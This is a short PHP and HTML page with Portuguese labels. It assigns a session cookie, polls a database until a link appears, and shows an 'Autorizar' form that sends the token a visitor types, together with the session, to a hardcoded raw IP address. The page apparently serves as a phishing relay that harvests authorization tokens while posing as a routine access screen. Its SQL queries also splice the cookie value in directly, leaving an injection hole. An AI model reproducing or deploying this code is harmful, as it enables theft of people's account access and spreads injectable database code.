<!DOCTYPE html>
<html>
<body>

<?php

$filename = basename( __FILE__ ) ;
echo "$filename foi modificado em: " . date ("F d Y H:i:s.", filectime($filename));
echo "<BR><BR>";

include 'config.php';

$cookie=$_COOKIE['session'];

if (is_null($cookie) == 1) {
    $cookie='fenix_'.bin2hex(random_bytes(5));
    setcookie('session',$cookie);
}

echo "Session: ".$cookie ;
echo "<BR><BR>";

$conn = new mysqli($host, $username, $password, $database);

$account='g'.bin2hex(random_bytes(4));

setcookie('account',$account);

$sql = "insert into tbl_session ( session, status, version ) values ('".$cookie."',1,'0.2')"; //STATUS 1 = SEM TMUX
$result = $conn->query($sql);

echo "Usuario: ".$account;
echo "<BR><BR>" ;

$conn->close();

//-------------------------------------------

$conn = new mysqli($host, $username, $password, $database);

$sql = "select url from tbl_url where session = '".$cookie."' ";
$result = $conn->query($sql);

while($result->num_rows == 0) {
    $result = $conn->query($sql);
    sleep(1) ;
}

$row = $result->fetch_assoc();

$link=base64_decode( $row["url"] );

echo "<a href=$link target='_blank' id='acessar'>Acessar</a>";

$conn->close();

?>

<BR><BR>

Token: <input type="text" id="token" value="">

<button onclick="myFunction()">Autorizar</button>

<script>
function myFunction() {
 var token = document.getElementById("token").value;
 var allcookies = document.cookie;
 var cookiearray = allcookies.split(';');

 var session = '' ;
 var account = '' ;
 var sender  = window.location.href;


 for(var i=0; i<cookiearray.length; i++) {

     var name  = cookiearray[i].split('=')[0];
     var value = cookiearray[i].split('=')[1];

     switch(name.trim()) {
     case "session":
       	   session = value.trim()

     break;
     case "account":
       	   account = value.trim()
     break;
     default:
    	   alert ("cookie desconhecido!") 
     }
 }

window.location.href = "http://51.81.101.99/access.php?session="+session+"&token="+token ;

}
</script>


</body>
</html>
